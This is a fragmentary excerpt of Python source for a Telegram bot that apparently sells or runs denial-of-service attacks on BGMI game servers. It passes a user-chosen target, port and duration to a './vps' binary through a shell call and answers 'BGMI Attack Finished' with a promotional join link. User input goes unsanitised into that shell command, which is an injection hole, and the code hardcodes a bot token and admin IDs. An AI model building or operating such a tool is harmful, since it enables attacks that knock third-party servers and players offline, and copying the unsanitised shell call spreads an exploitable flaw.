...
bot = telebot.TeleBot('7571162188:AAEYPsajzuMhPjndlL3R8q7qQ6sIQZJZX5w')

# Admin user IDs
admin_id = {"1630422629", "6406776405", "1600832237"}
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 181:
                ...
                full_command = f"./vps {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time} JOIN:-https://t.me/+fXj9WZg0ukg5N2E1"
        else:
...
def welcome_start(message):
    ...
    response = f'''👋🏻Welcome to rahul  
   Home, {user_name}! Feel Free to Explore.
